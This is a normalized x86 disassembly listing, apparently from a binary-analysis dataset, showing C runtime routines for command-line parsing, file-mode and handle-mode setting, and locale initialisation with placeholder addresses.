mov esi rw-data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movsx eax al
push eax
call sub_43835a
pop ecx
test eax eax
je r-xdata
test bl bl
sete bl
mov eax esi
pop esi
pop ebx
retn
test bl bl
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
mov al [ esi ]
cmp al 0x20
jg r-xdata
cmp al 0x20
jg r-xdata
inc esi
sub_42ae57
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
push 0x20
xor dl dl
pop esi
mov eax rw-data
cmp ecx 0x22
jne r-xdata
test cx cx
je r-xdata
add eax 0x2
jmp r-xdata
test dl dl
sete dl
pop esi
retn
test dl dl
je r-xdata
movzx ecx [ eax ]
cmp cx si
ja r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx si
ja r-xdata
add eax 0x2
sub_42ae9d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
add eax 0x3
push edi
xor edi edi
shr eax 0x2
cmp [ ebp + 0xc ] esi
sbb ebx ebx
not ebx
and ebx eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
add esi 0x4
inc edi
cmp edi ebx
jne r-xdata
mov ecx eax
call [ r--data ]
call [ ebp - 0x8 ]
sub_42aef9
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
jmp r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
xor eax eax
add esi 0x4
mov ecx edi
call [ r--data ]
call edi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_42af4a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
push 0x16
pop eax
pop ebp
retn
sub_42af76
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4000
je r-xdata
mov ecx rw-data
xchg [ ecx ] eax
xor eax eax
pop ebp
retn
cmp eax 0x8000
je r-xdata
cmp eax 0x10000
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
push 0x16
pop eax
pop ebp
retn
sub_42afb3
push 0x18
push r--data
call sub_40d260
mov edi [ ebp + 0xc ]
cmp edi 0x4000
je r-xdata
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
cmp edi 0x8000
je r-xdata
test esi esi
js r-xdata
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
cmp edi 0x10000
je r-xdata
call sub_42fef5
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
cmp edi 0x40000
je r-xdata
mov ecx esi
sar ecx 0x6
mov [ ebp - 0x20 ] ecx
mov eax esi
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x24 ] edx
mov eax [ ecx * 4 + rw-data ]
movzx eax [ eax + edx + 0x28 ]
and eax 0x1
je r-xdata
cmp edi 0x20000
je r-xdata
push esi
call sub_43901e
pop ecx
or ebx 0xffffffff
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
jmp r-xdata
push edi
push esi
call sub_42b0c1
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fdcf
call sub_40d2a6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b0a0
mov eax ebx
jmp r-xdata
sub_42b0c1
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi eax
and eax 0x3f
sar edi 0x6
imul edx eax 0x30
mov esi [ edi * 4 + rw-data ]
mov al [ esi + edx + 0x28 ]
mov bl [ esi + edx + 0x29 ]
movzx ecx al
and ecx 0x80
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x4000
je r-xdata
or al 0x80
mov [ esi + edx + 0x28 ] al
mov ecx [ edi * 4 + rw-data ]
mov [ ecx + edx + 0x29 ] 0x0
cmp ecx 0x8000
je r-xdata
test bl bl
jne r-xdata
mov eax 0x8000
jmp r-xdata
and al 0x7f
mov [ esi + edx + 0x28 ] al
jmp r-xdata
cmp ecx 0x10000
je r-xdata
xor eax eax
cmp bl 0x1
setne al
dec eax
and eax 0x30000
add eax 0x10000
mov eax 0x4000
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
or al 0x80
mov [ esi + edx + 0x28 ] al
mov eax [ edi * 4 + rw-data ]
mov [ eax + edx + 0x29 ] 0x2
jmp r-xdata
cmp ecx 0x20000
je r-xdata
cmp ecx 0x40000
jne r-xdata
or al 0x80
mov [ esi + edx + 0x28 ] al
mov eax [ edi * 4 + rw-data ]
mov [ eax + edx + 0x29 ] 0x1
jmp r-xdata
sub_42b206
push 0x8
push r--data
call sub_40d260
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
push [ eax ]
call sub_43aed9
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b244
call sub_40d2a6
retn 0xc
sub_42b250
push 0x8
push r--data
call sub_40d260
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_42b57c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b287
call sub_40d2a6
retn 0xc
sub_42b293
push 0x8
push r--data
call sub_40d260
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
[ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b2cf
call sub_40d2a6
retn 0xc
sub_42b2db
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42b206
mov esp ebp
pop ebp
retn
sub_42b303
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42b293
mov esp ebp
pop ebp
retn
sub_42b32b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42b250
mov esp ebp
pop ebp
retn
sub_42b353
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
lea eax [ ebp - 0x1 ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
push eax
call sub_42b1cb
mov esp ebp
pop ebp
retn
sub_42b392
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_42b412
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_42b4f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push 0xb8
push 0x1
mov edi ecx
call sub_42d196
mov esi eax
mov eax [ edi ]
push 0x0
mov [ eax ] esi
call sub_42d0aa
add esp 0xc
test esi esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov [ ebp - 0x14 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call sub_42b32b
pop ecx
pop ecx
sub_42b57c
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov eax [ eax ]
push [ eax + 0x4c ]
mov eax [ esi ]
push [ eax ]
call sub_42b9bf
mov eax [ esi + 0x10 ]
push [ eax ]
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi ]
push [ eax ]
call sub_42c25f
mov ecx [ esi + 0x8 ]
add esp 0x14
mov [ ecx ] eax
test eax eax
je r-xdata
mov eax [ esi ]
push [ eax ]
call sub_43b0bc
mov eax [ esi ]
push [ eax ]
call sub_43af58
pop ecx
pop ecx
mov eax [ esi + 0x10 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esi ]
push [ eax ]
mov eax [ esi + 0x4 ]
mov eax [ eax ]
add eax 0x4c
push eax
call sub_43b1b6
mov eax [ esi ]
push [ eax ]
call sub_43b0bc
mov eax [ esi + 0x4 ]
add esp 0xc
mov eax [ eax ]
test [ eax + 0x350 ] 0x2
jne r-xdata
mov edx rw-data
push edi
pop esi
retn
test [ rw-data ] 0x1
jne r-xdata
sbb eax eax
or eax ecx
test di di
je r-xdata
push [ eax + 0x4c ]
push rw-data
call sub_43b1b6
mov eax [ rw-data ]
pop ecx
pop ecx
pop esi
mov ecx [ eax + 0x88 ]
mov [ rw-data ] ecx
mov ecx [ eax ]
mov [ rw-data ] ecx
mov eax [ eax + 0x4 ]
mov [ rw-data ] eax
retn
mov eax rw-data
xchg [ eax ] ecx
xor eax eax
jmp r-xdata
mov di [ eax + 0x2 ]
cmp di [ edx + 0x2 ]
jne r-xdata
pop edi
test eax eax
je r-xdata
add eax 0x4
add edx 0x4
test di di
jne r-xdata
mov di [ eax ]
xor ecx ecx
inc ecx
cmp di [ edx ]
jne r-xdata
sub_42b6fb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ebx
push 0x55
push [ ebp + 0x8 ]
call sub_434d0d
mov ebx eax
pop ecx
pop ecx
cmp ebx 0x55
jb r-xdata
xor eax eax
pop ebp
retn
lea eax [ ebx * 2 + 0x2 ]
push edi
push eax
call sub_42d0e4
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebx + 0x1 ]
push eax
push [ ebp + 0x8 ]
push eax
push edi
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
mov eax edi
jmp r-xdata
sub_42b76c
push 0x8
push r--data
call sub_40d260
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_40d2a6
retn
push 0x4
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_43b1b6
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b7b5
sub_42b7be
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_436740
add esp 0xc
xor esi esi
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_42fdfc
int3
lea eax [ edi + 0x80 ]
cmp [ eax ] si
je r-xdata
add edi 0x100
cmp [ edi ] si
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42c005
add esp 0x14
pop edi
pop esi
pop ebp
retn
push edi
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42c005
add esp 0x14
sub_42b82e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
push 0x1ca
push ebx
push edi
call sub_40de60
mov esi [ ebp + 0xc ]
add esp 0xc
movzx eax [ esi ]
test ax ax
jne r-xdata
push 0x2e
pop ecx
cmp ax cx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] ebx
lea eax [ esi + 0x2 ]
cmp [ eax ] bx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or eax 0xffffffff
lea ecx [ esi + eax * 2 ]
movzx ebx [ ecx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
push 0x2c
pop edx
test ecx ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x100 ]
push 0x10
push eax
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
cmp ecx 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x11e ] ax
jmp r-xdata
cmp ecx 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
push 0x2e
pop ecx
cmp bx cx
je r-xdata
cmp eax 0x10
jae r-xdata
cmp ebx 0x5f
je r-xdata
push eax
push esi
push 0x40
push edi
jmp r-xdata
test bx bx
je r-xdata
push eax
push esi
push 0x40
lea eax [ edi + 0x80 ]
jmp r-xdata
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
push eax
push esi
push 0x10
lea eax [ edi + 0x100 ]
cmp bx dx
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push 0x2c
pop eax
cmp bx ax
je r-xdata
call sub_42fdfc
int3
test bx bx
je r-xdata
mov esi [ ebp - 0x8 ]
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
push r--data
push esi
call sub_43ac78
pop ecx
pop ecx
test eax eax
je r-xdata
sub_42b95d
mov edi edi
push ebp
mov ebp esp
push esi
call sub_42fa1d
mov edx [ ebp + 0x8 ]
mov esi eax
push 0x0
pop eax
mov ecx [ esi + 0x350 ]
test cl 0x2
sete al
inc eax
cmp edx 0xffffffff
je r-xdata
or [ rw-data ] 0xffffffff
test edx edx
je r-xdata
pop esi
pop ebp
retn
cmp edx 0x1
je r-xdata
or ecx 0x2
cmp edx 0x2
je r-xdata
and ecx 0xfffffffd
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
mov [ esi + 0x350 ] ecx
jmp r-xdata
sub_42b9bf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x2e
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax + 0xc ] 0x0
push eax
call sub_43aed9
pop ecx
pop edi
sub_42b9ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x5
ja r-xdata
xor eax eax
test eax eax
je r-xdata
push 0x83
lea ecx [ ebp - 0x10c ]
push ecx
push 0xffffffff
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_42befc
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_42ba52
mov edi edi
push ebp
mov ebp esp
sub esp 0x1f4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1e8 ] eax
mov [ ebp - 0x1ec ] ebx
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x1dc ] edi
test esi esi
jne r-xdata
call sub_42fa1d
push 0x55
lea ecx [ eax + 0x68 ]
mov [ ebp - 0x1d8 ] ecx
lea ecx [ eax + 0x6c ]
mov [ ebp - 0x1e0 ] ecx
lea ecx [ eax + 0x172 ]
add eax 0x2a0
mov [ ebp - 0x1d4 ] ecx
push eax
push [ ebp + 0x18 ]
xor ecx ecx
mov [ ebp - 0x1f0 ] eax
push edi
mov [ ebp - 0x1f4 ] ecx
mov [ ebp - 0x1e4 ] ecx
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp [ esi ] 0x43
jne r-xdata
call sub_42fdfc
int3
mov edi esi
xor edx edx
lea ecx [ edi + 0x2 ]
xor edi edi
cmp [ esi + 0x2 ] di
jne r-xdata
mov ax [ edi ]
add edi 0x2
cmp ax dx
jne r-xdata
sub edi ecx
sar edi 0x1
cmp edi 0x83
jae r-xdata
mov esi [ ebp - 0x1e8 ]
push r--data
push [ ebp + 0x10 ]
push esi
call sub_436740
add esp 0xc
test eax eax
jne r-xdata
call sub_431078
xor ebx ebx
test al al
lea eax [ ebp - 0x1d0 ]
push esi
push eax
sete bl
call sub_42b82e
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x1d4 ]
mov ecx esi
push edi
push edi
push edi
push edi
push edi
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x1d8 ]
lea eax [ ebp - 0x1d0 ]
test ebx ebx
mov ebx [ ebp - 0x1d8 ]
push eax
push ebx
push eax
je r-xdata
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
mov eax esi
jmp r-xdata
mov [ ebx ] edi
mov ebx [ ebp - 0x1dc ]
xor esi esi
mov ecx ebx
lea edx [ ecx + 0x2 ]
push 0x2
lea eax [ ebp - 0x1e4 ]
push eax
push 0x20001004
push esi
call sub_430a42
test eax eax
je r-xdata
call sub_43b94a
call sub_43c2a0
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x1e0 ]
mov ecx esi
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ax [ ecx ]
add ecx 0x2
cmp ax si
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push ebx
push 0x55
push [ ebp - 0x1f0 ]
call sub_436871
add esp 0x10
test eax eax
je r-xdata
call [ GetACP@IAT ]
mov [ ebp - 0x1e4 ] eax
mov eax [ ebp - 0x1e4 ]
test eax eax
jne r-xdata
push esi
call sub_430c92
test eax eax
je r-xdata
lea eax [ ebp - 0x1d0 ]
push eax
push 0x83
push [ ebp - 0x1d4 ]
call sub_42b7be
mov ebx [ ebp - 0x1dc ]
add esp 0xc
test ebx ebx
je r-xdata
add esp 0xc
test eax eax
je r-xdata
mov ebx [ ebp - 0x1d4 ]
mov esi [ ebp - 0x1e8 ]
push ebx
push [ ebp + 0x10 ]
push esi
call sub_436740
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1d8 ]
mov eax [ eax ]
mov [ ebx ] eax
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
push ebx
push esi
push [ ebp + 0x18 ]
push [ ebp - 0x1dc ]
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
movzx eax ax
mov [ ebx ] eax
lea ebx [ edi + 0x1 ]
push ebx
push esi
push 0x83
push [ ebp - 0x1d4 ]
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
xor ebx ebx
cmp [ esi ] bx
je r-xdata
lea ecx [ ebp - 0xb0 ]
lea edx [ ecx + 0x2 ]
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
push ebx
push esi
push 0x55
push [ ebp - 0x1f0 ]
mov eax [ ebp - 0x1e0 ]
xor ecx ecx
mov [ eax ] cx
mov ecx 0x83
cmp edi ecx
jae r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1f4 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
push [ ebp + 0x18 ]
push ebx
jmp r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
lea eax [ edi + 0x1 ]
push eax
push esi
push ecx
push [ ebp - 0x1e0 ]
call sub_436871
add esp 0x10
test eax eax
je r-xdata
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov ebx [ ebp - 0x1ec ]
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
sub_42bdc9
push 0x8
push r--data
call sub_40d260
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40d2a6
retn
push 0x5
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42be6c
cmp [ esi ] 0x0
je r-xdata
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
push esi
call sub_42d0aa
pop ecx
push 0x4
call sub_42f32c
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_43b0bc
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42be78
cmp [ eax + 0xc ] 0x0
jne r-xdata
push [ esi + 0x4 ]
call sub_42d0aa
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_43af58
pop ecx
sub_42be81
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_42fa1d
push 0x8
push 0x1
mov esi eax
call sub_42d196
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_43b13f
call sub_437db5
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x4c ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x48 ]
mov [ eax + 0x4 ] ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
call sub_42b2db
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x5
call sub_42b303
mov esi [ ebp - 0x4 ]
add esp 0x10
and [ ebp - 0x4 ] 0x0
xor esi esi
jmp r-xdata
push 0x0
call sub_42d0aa
pop ecx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_42befc
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x5
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
push ebx
push edi
xor ebx ebx
push 0x8
inc ebx
push ebx
call sub_42d196
mov edi eax
mov [ ebp - 0x4 ] edi
pop ecx
pop ecx
test edi edi
jne r-xdata
push esi
push 0xb8
push ebx
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
call sub_42fef5
xor ebx ebx
mov [ eax ] 0xc
jmp r-xdata
push 0x220
push ebx
call sub_42d196
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
call sub_42fef5
xor ebx ebx
mov [ eax ] 0xc
jmp r-xdata
push edi
call sub_42d0aa
pop ecx
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push rw-data
push esi
call sub_42b9bf
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
call sub_42c25f
add esp 0x14
test eax eax
je r-xdata
call sub_42fef5
mov [ eax ] 0xc
jmp r-xdata
push esi
call sub_42d0aa
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push esi
call sub_43b0bc
push esi
xor esi esi
call sub_43af58
pop ecx
pop ecx
push edi
push [ esi + 0x8 ]
call sub_437eac
pop ecx
pop ecx
test eax eax
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov ecx esi
mov [ edi ] ebx
xor esi esi
mov ebx eax
mov [ eax ] ecx
mov ecx edi
xor edi edi
mov [ eax + 0x4 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
push edi
call sub_42d0aa
mov edi [ ebp - 0x4 ]
pop ecx
sub_42c005
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
push esi
mov esi ebx
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop esi
pop ebx
pop ebp
retn
push edi
lea edi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_42fdfc
int3
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
lea edi [ edi + 0x4 ]
push [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43666b
add esp 0xc
test eax eax
jne r-xdata
pop edi
sub_42c046
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
and [ ebp - 0xc ] 0x0
and [ ebp - 0x10 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_42fa1d
mov [ ebp - 0x8 ] eax
call sub_43b13f
mov eax [ ebp - 0x8 ]
lea ecx [ ebp - 0x1 ]
or [ eax + 0x350 ] 0x10
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
call sub_42b1cb
mov eax [ ebp - 0xc ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_42c0c6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
xor esi esi
inc esi
push 0x6a6
mov [ ebp - 0x8 ] esi
call sub_42d0e4
mov ebx eax
xor eax eax
pop ecx
test ebx ebx
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea edi [ ebx + 0x4 ]
mov [ edi ] ax
mov [ ebx ] esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x30 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_42c005
mov eax r--data
add esp 0x18
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
mov eax [ ebp - 0xc ]
lea ecx [ eax + 0x10 ]
mov eax [ eax ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
push r--data
push 0x351
push edi
call sub_43666b
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
push ebx
call sub_42d0aa
pop ecx
mov ecx [ esi + 0x28 ]
or edi 0xffffffff
test ecx ecx
je r-xdata
mov ecx [ esi + 0x28 ]
or edi 0xffffffff
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
add ecx 0xc
not eax
mov [ ebp - 0x4 ] ecx
and [ ebp - 0x8 ] eax
